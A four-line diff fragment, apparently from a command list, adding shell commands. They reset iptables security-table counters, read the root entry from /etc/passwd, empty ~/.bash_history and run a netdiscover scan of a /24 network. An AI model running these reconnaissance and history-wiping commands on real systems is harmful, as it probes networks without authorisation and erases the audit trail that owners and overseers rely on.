+iptables -w -t security -L OUTPUT --zero OUTPUT -nxv
+/bin/bash -c grep "^root:" /etc/passwd | cut -f4 -d:
+echo "" > ~/.bash_history
+netdiscover -I eth0 -r 199.66.11.0/24
+
